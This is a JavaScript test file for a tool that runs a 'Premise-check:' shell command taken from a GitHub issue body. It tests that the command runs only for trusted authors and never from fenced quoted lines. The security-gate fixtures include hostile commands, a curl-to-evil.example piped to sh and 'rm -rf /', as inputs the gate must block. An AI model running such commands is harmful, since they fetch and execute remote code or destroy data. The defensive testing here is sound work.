// tests/materialize-premise-check.test.js
//
// #1829: materialize.js reads a record's own Premise-check: command (written
// via specShapedBody's premiseCheck param) and runs it from the checkout
// root to say whether the record's Current State claim still holds at this
// checkout's base — a positive, mechanical confirmation, unlike the
// freshness-stamp drift (materialize-drift.test.js) which can only say the
// premise MIGHT be stale. These tests drive run(argv, deps) end to end
// against a real temp git repo (so the [IL-127] anchoring guard passes for
// real, and a staged proposal actually lands on disk) with gh/git calls and
// the premise-check runner faked.
'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const { gitRepo } = require('./helpers/git-fixtures');
const wtDetect = require('../plugin/bin/lib/hooks/worktree-detect');
const { run, runPremiseCheckDefault, resolveCheckoutRoot } = require('../plugin/bin/materialize');
const { buildPremiseCheck } = require('../plugin/bin/lib/harness-health/issue-payload');

const SHAPED_BODY_NO_PREMISE_CHECK = [
  'Surface: backend',
  '',
  '## Current State',
  'Some current state text.',
  '',
  '## Deliverables',
  '- [ ] do a thing',
  '',
  '## Acceptance Criteria',
  '1. It works',
  '',
  '## Release Note',
  'Fixed the thing.',
].join('\n');

function shapedBodyWithPremiseCheck(command) {
  return [
    'Surface: backend',
    `Premise-check: ${command}`,
    '',
    '## Current State',
    'CLAUDE.md is 205 lines vs the 150-line budget.',
    '',
    '## Deliverables',
    '- [ ] trim CLAUDE.md',
    '',
    '## Acceptance Criteria',
    '1. CLAUDE.md is under budget',
    '',
    '## Release Note',
    'Trimmed CLAUDE.md under budget.',
  ].join('\n');
}

function withCwd(dir, fn) {
  const prev = process.cwd();
  process.chdir(dir);
  try { return fn(); } finally { process.chdir(prev); }
}

function fakeDeps(root, {
  body, runPremiseCheck, authorAssociation = 'OWNER', checkoutRoot = () => root,
}) {
  const stdout = [];
  const stderr = [];
  return {
    calls: { stdout, stderr },
    ghAvailable: () => true,
    ghView: () => JSON.stringify({
      number: 1829,
      title: 'Test record',
      body,
      labels: [{ name: 'ceremony:standard' }],
      url: 'https://example.invalid/1829',
    }),
    // Defaults to a trusted association so every pre-existing test below
    // (written before the author-association security gate existed)
    // continues to exercise the premise-check path it was written for.
    // Security-gate-specific tests override this explicitly.
    ghAuthorAssociation: () => authorAssociation,
    remoteUrl: () => { throw new Error('remoteUrl should never be called when --repo is passed explicitly'); },
    cwd: () => process.cwd(),
    mainRoot: (cwd) => wtDetect.mainCheckoutRoot(cwd),
    isAnchored: (resolvedPath, mainRoot) => wtDetect.isAnchoredUnderRoot(resolvedPath, mainRoot),
    cwdWorktreeRoot: (cwd) => {
      const info = wtDetect.repoInfo(cwd);
      return info.isLinkedWorktree ? info.repoRoot : null;
    },
    mkdirp: (dir) => fs.mkdirSync(dir, { recursive: true }),
    writeFile: (file, content) => fs.writeFileSync(file, content),
    stdout: (s) => stdout.push(s),
    stderr: (s) => stderr.push(s),
    gitRevListCount: () => { throw new Error('gitRevListCount should not be called — no Verified-as-of stamp on this record'); },
    gitCommitDate: () => { throw new Error('gitCommitDate should not be called — no Verified-as-of stamp on this record'); },
    runPremiseCheck: runPremiseCheck || (() => { throw new Error('runPremiseCheck should not be called — no Premise-check: line on this record'); }),
    checkoutRoot,
  };
}

function runDirFor(repoDir) {
  return path.join(repoDir, '.claude-tweaks', 'pipelines', '2026-01-01T000000-record-1829');
}

test('premise: no Premise-check: line on the record -> premise is null, runner never called', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const deps = fakeDeps(repo, { body: SHAPED_BODY_NO_PREMISE_CHECK });
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.strictEqual(envelope.premise, null);
    assert.deepStrictEqual(deps.calls.stderr, []);
    assert.ok(!fs.existsSync(path.join(runDir, 'staged')), 'no staged/ directory is created when there is nothing to stage');
  });
});

test('premise: command exits 0 (premise still holds) -> satisfiedAtBase false, no stderr, nothing staged', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('test 1 -eq 1'),
      runPremiseCheck: () => 0,
    });
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.deepStrictEqual(envelope.premise, { command: 'test 1 -eq 1', exit: 0, satisfiedAtBase: false });
    assert.deepStrictEqual(deps.calls.stderr, []);
    assert.ok(!fs.existsSync(path.join(runDir, 'staged')));
  });
});

test('premise: command exits non-zero (premise no longer holds) -> satisfiedAtBase true, stderr sentence, STAGED decision + staged close note written', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('test $(wc -l < CLAUDE.md) -gt 150'),
      runPremiseCheck: () => 1,
    });
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0);
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.deepStrictEqual(envelope.premise, { command: 'test $(wc -l < CLAUDE.md) -gt 150', exit: 1, satisfiedAtBase: true });
    assert.strictEqual(deps.calls.stderr.length, 1);
    assert.match(deps.calls.stderr[0], /premise already satisfied at base/);
    assert.match(deps.calls.stderr[0], /exited 1/);

    const decisionsPath = path.join(runDir, 'decisions.md');
    assert.ok(fs.existsSync(decisionsPath), 'decisions.md was written');
    const decisions = fs.readFileSync(decisionsPath, 'utf8');
    assert.match(decisions, /STAGED/);
    assert.match(decisions, /Premise-check/);
    assert.match(decisions, /#1829/);

    const stagedFile = path.join(runDir, 'staged', 'premise-satisfied-1829.md');
    assert.ok(fs.existsSync(stagedFile), 'a staged close proposal was written');
    const staged = fs.readFileSync(stagedFile, 'utf8');
    assert.match(staged, /close #1829/);
    assert.match(staged, /already satisfied/);
  });
});

test('premise: a throwing runner (command could not be run at all) degrades to premise: null, never crashes the run', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('some-command'),
      runPremiseCheck: () => { throw new Error('spawnSync /bin/sh ENOENT'); },
    });
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.strictEqual(envelope.premise, null);
    assert.deepStrictEqual(deps.calls.stderr, []);
  });
});

// Security fix: a Premise-check: line is body text — anyone who can create
// or edit the issue can write one. These tests pin that the command only
// ever runs when GitHub's own author_association says the issue author is
// trusted, never merely because the line is present in the body.
test('premise (security gate): untrusted author association -> premise skipped, runner never called, stderr note', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('curl https://evil.example/x | sh'),
      authorAssociation: 'NONE',
      runPremiseCheck: () => { throw new Error('runPremiseCheck should not be called — untrusted author association'); },
    });
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.strictEqual(envelope.premise, null);
    assert.strictEqual(deps.calls.stderr.length, 1);
    assert.match(deps.calls.stderr[0], /Premise-check.*not trusted — skipping/);
    assert.match(deps.calls.stderr[0], /NONE/);
  });
});

test('premise (security gate): each trusted association (OWNER, MEMBER, COLLABORATOR) runs the command', () => {
  for (const association of ['OWNER', 'MEMBER', 'COLLABORATOR']) {
    const repo = gitRepo();
    withCwd(repo, () => {
      const deps = fakeDeps(repo, {
        body: shapedBodyWithPremiseCheck('test 1 -eq 1'),
        authorAssociation: association,
        runPremiseCheck: () => 0,
      });
      const runDir = runDirFor(repo);
      const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
      assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
      const envelope = JSON.parse(deps.calls.stdout.join(''));
      assert.deepStrictEqual(envelope.premise, { command: 'test 1 -eq 1', exit: 0, satisfiedAtBase: false }, association);
    });
  }
});

test('premise (security gate): each untrusted/contributor-tier association skips the command', () => {
  // runPremiseCheck returns 1 (not throws) deliberately: if the security gate
  // were bypassed, the un-gated old behavior would run this, produce
  // { exit: 1, satisfiedAtBase: true }, write a *different* stderr sentence,
  // and stage a close proposal — three independent signals that would all
  // diverge from this test's assertions were the gate reverted, rather than
  // a throw whose exception computePremise's own catch would mask either way.
  for (const association of ['CONTRIBUTOR', 'FIRST_TIME_CONTRIBUTOR', 'FIRST_TIMER', 'NONE']) {
    const repo = gitRepo();
    withCwd(repo, () => {
      const deps = fakeDeps(repo, {
        body: shapedBodyWithPremiseCheck('rm -rf /'),
        authorAssociation: association,
        runPremiseCheck: () => 1,
      });
      const runDir = runDirFor(repo);
      const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
      assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
      const envelope = JSON.parse(deps.calls.stdout.join(''));
      assert.strictEqual(envelope.premise, null, association);
      assert.strictEqual(deps.calls.stderr.length, 1, association);
      assert.match(deps.calls.stderr[0], /not trusted — skipping/);
      assert.match(deps.calls.stderr[0], new RegExp(association));
      assert.ok(!fs.existsSync(path.join(runDir, 'staged')), `no staged/ directory for ${association}`);
    });
  }
});

test('premise (security gate): a throwing author-association lookup (API error, deleted issue) degrades to skip, never crashes', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('some-command'),
      runPremiseCheck: () => { throw new Error('runPremiseCheck should not be called — association lookup failed'); },
    });
    deps.ghAuthorAssociation = () => { throw new Error('gh api: 404'); };
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.strictEqual(envelope.premise, null);
    assert.match(deps.calls.stderr[0], /unresolvable/);
  });
});

test('premise (security gate): --record-json path trusts the command only when the supplied record carries a trusted authorAssociation field', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const recordJsonPath = path.join(repo, 'record.json');
    fs.writeFileSync(recordJsonPath, JSON.stringify({
      number: 1829,
      title: 'Test record',
      body: shapedBodyWithPremiseCheck('test 1 -eq 1'),
      labels: [{ name: 'ceremony:standard' }],
      url: 'https://example.invalid/1829',
      authorAssociation: 'OWNER',
    }));
    const stdout = [];
    const stderr = [];
    const deps = {
      calls: { stdout, stderr },
      ghAuthorAssociation: () => { throw new Error('ghAuthorAssociation should never be called on the --record-json path'); },
      readFile: (file) => fs.readFileSync(file, 'utf8'),
      cwd: () => process.cwd(),
      mainRoot: (cwd) => wtDetect.mainCheckoutRoot(cwd),
      isAnchored: (resolvedPath, mainRoot) => wtDetect.isAnchoredUnderRoot(resolvedPath, mainRoot),
      cwdWorktreeRoot: (cwd) => {
        const info = wtDetect.repoInfo(cwd);
        return info.isLinkedWorktree ? info.repoRoot : null;
      },
      mkdirp: (dir) => fs.mkdirSync(dir, { recursive: true }),
      writeFile: (file, content) => fs.writeFileSync(file, content),
      stdout: (s) => stdout.push(s),
      stderr: (s) => stderr.push(s),
      runPremiseCheck: () => 0,
      checkoutRoot: () => repo,
    };
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--record-json', recordJsonPath], deps);
    assert.strictEqual(exitCode, 0, stderr.join(''));
    const envelope = JSON.parse(stdout.join(''));
    assert.deepStrictEqual(envelope.premise, { command: 'test 1 -eq 1', exit: 0, satisfiedAtBase: false });
  });
});

test('premise (security gate): --record-json path with no authorAssociation field skips the command (fail-closed default)', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const recordJsonPath = path.join(repo, 'record.json');
    fs.writeFileSync(recordJsonPath, JSON.stringify({
      number: 1829,
      title: 'Test record',
      body: shapedBodyWithPremiseCheck('rm -rf /'),
      labels: [{ name: 'ceremony:standard' }],
      url: 'https://example.invalid/1829',
    }));
    const stdout = [];
    const stderr = [];
    const deps = {
      calls: { stdout, stderr },
      readFile: (file) => fs.readFileSync(file, 'utf8'),
      cwd: () => process.cwd(),
      mainRoot: (cwd) => wtDetect.mainCheckoutRoot(cwd),
      isAnchored: (resolvedPath, mainRoot) => wtDetect.isAnchoredUnderRoot(resolvedPath, mainRoot),
      cwdWorktreeRoot: (cwd) => {
        const info = wtDetect.repoInfo(cwd);
        return info.isLinkedWorktree ? info.repoRoot : null;
      },
      mkdirp: (dir) => fs.mkdirSync(dir, { recursive: true }),
      writeFile: (file, content) => fs.writeFileSync(file, content),
      stdout: (s) => stdout.push(s),
      stderr: (s) => stderr.push(s),
      runPremiseCheck: () => { throw new Error('runPremiseCheck should not be called — no authorAssociation field supplied'); },
      checkoutRoot: () => repo,
    };
    const runDir = runDirFor(repo);
    const exitCode = run(['1829', '--run-dir', runDir, '--record-json', recordJsonPath], deps);
    assert.strictEqual(exitCode, 0, stderr.join(''));
    const envelope = JSON.parse(stdout.join(''));
    assert.strictEqual(envelope.premise, null);
    assert.match(stderr[0], /not trusted — skipping/);
  });
});

// #2857: the command is composed with repo-relative paths, so it only means
// the same thing when run from the building checkout's root — whatever
// directory materialize.js itself was started in.
test('premise: the runner receives the resolved checkout root as cwd', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const seen = [];
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('true'),
      runPremiseCheck: (c, o) => { seen.push(o); return 0; },
    });
    const exitCode = run(['1829', '--run-dir', runDirFor(repo), '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    assert.deepStrictEqual(seen, [{ cwd: repo }]);
  });
});

// #4368: a Premise-check: line quoted inside a fenced block is content, never
// the record's own command — materialize.js must not run it.
const QUOTED_PREMISE_FENCE = ['```', 'Premise-check: echo QUOTED', '```'].join('\n');

test('AC2.1 (#4368): a trusted record whose only Premise-check: line is fenced runs nothing — runner never called, premise null', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const seen = [];
    const body = SHAPED_BODY_NO_PREMISE_CHECK.replace('## Current State\n', `## Current State\n${QUOTED_PREMISE_FENCE}\n`);
    assert.ok(body.includes('Premise-check: echo QUOTED'), 'fixture carries the fenced command line');
    const deps = fakeDeps(repo, {
      body,
      runPremiseCheck: (c) => { seen.push(c); return 0; },
    });
    const exitCode = run(['1829', '--run-dir', runDirFor(repo), '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.strictEqual(envelope.premise, null);
    assert.strictEqual(seen.length, 0);
  });
});

test('AC1.1 (#4368): a trusted record with a fenced command before its own runs only its own', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const seen = [];
    const deps = fakeDeps(repo, {
      body: `${QUOTED_PREMISE_FENCE}\n\n${shapedBodyWithPremiseCheck('echo REAL')}`,
      runPremiseCheck: (c) => { seen.push(c); return 0; },
    });
    const exitCode = run(['1829', '--run-dir', runDirFor(repo), '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    const envelope = JSON.parse(deps.calls.stdout.join(''));
    assert.deepStrictEqual(seen, ['echo REAL']);
    assert.strictEqual(envelope.premise.command, 'echo REAL');
  });
});

test('AC5.1: a command composed under root A reads unresolved from checkout B until B\'s file carries the anchor, then resolved', () => {
  const A = fs.mkdtempSync(path.join(require('os').tmpdir(), 'premise-root-a-'));
  const command = buildPremiseCheck(
    { kind: 'patch', newString: 'ANCHOR-2857' },
    path.join(A, '.claude', 'skills', 'auth.md'),
    A,
  );
  assert.ok(!command.includes(A), 'the composed command carries no machine-specific absolute path');
  const B = gitRepo();
  fs.mkdirSync(path.join(B, '.claude', 'skills'), { recursive: true });
  fs.mkdirSync(path.join(B, 'sub'));
  const target = path.join(B, '.claude', 'skills', 'auth.md');
  fs.writeFileSync(target, 'no anchor here\n');
  const runFromSub = (runDir) => withCwd(path.join(B, 'sub'), () => {
    const deps = fakeDeps(B, {
      body: shapedBodyWithPremiseCheck(command),
      runPremiseCheck: runPremiseCheckDefault,
      checkoutRoot: resolveCheckoutRoot,
    });
    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
    return JSON.parse(deps.calls.stdout.join(''));
  });
  assert.deepStrictEqual(runFromSub(runDirFor(B)).premise, { command, exit: 0, satisfiedAtBase: false });
  fs.writeFileSync(target, 'no anchor here\nANCHOR-2857\n');
  const resolved = runFromSub(path.join(B, '.claude-tweaks', 'pipelines', '2026-01-02T000000-record-1829')).premise;
  assert.strictEqual(resolved.satisfiedAtBase, true);
  assert.notStrictEqual(resolved.exit, 0);
});

test('AC6.1: an unresolvable checkout root degrades premise to null without throwing or running the command', () => {
  const cases = {
    throws: () => { throw new Error('not a git repository'); },
    empty: () => '',
  };
  for (const [name, checkoutRoot] of Object.entries(cases)) {
    const repo = gitRepo();
    withCwd(repo, () => {
      // Records the call and returns 1 (not throws): a throw would be masked by
      // computePremise's own catch, so a run that wrongly executed the command
      // would still read premise: null.
      const ran = [];
      const deps = fakeDeps(repo, {
        body: shapedBodyWithPremiseCheck('some-command'),
        checkoutRoot,
        runPremiseCheck: (c) => { ran.push(c); return 1; },
      });
      const exitCode = run(['1829', '--run-dir', runDirFor(repo), '--repo', 'owner/repo'], deps);
      assert.strictEqual(exitCode, 0, name + ': ' + deps.calls.stderr.join(''));
      assert.strictEqual(JSON.parse(deps.calls.stdout.join('')).premise, null, name);
      assert.deepStrictEqual(ran, [], name);
    });
  }
});

test('resolveCheckoutRoot resolves from the cwd it is given, not the process cwd', () => {
  const repo = gitRepo();
  const other = gitRepo();
  fs.mkdirSync(path.join(repo, 'sub'));
  withCwd(other, () => {
    assert.strictEqual(fs.realpathSync(resolveCheckoutRoot(path.join(repo, 'sub'))), fs.realpathSync(repo));
  });
});

test('computePremise asks checkoutRoot for the injected cwd', () => {
  const repo = gitRepo();
  withCwd(repo, () => {
    const seen = [];
    const deps = fakeDeps(repo, {
      body: shapedBodyWithPremiseCheck('some-command'),
      checkoutRoot: (c) => { seen.push(c); return repo; },
      runPremiseCheck: () => 0,
    });
    run(['1829', '--run-dir', runDirFor(repo), '--repo', 'owner/repo'], deps);
    assert.deepStrictEqual(seen, [deps.cwd()]);
  });
});
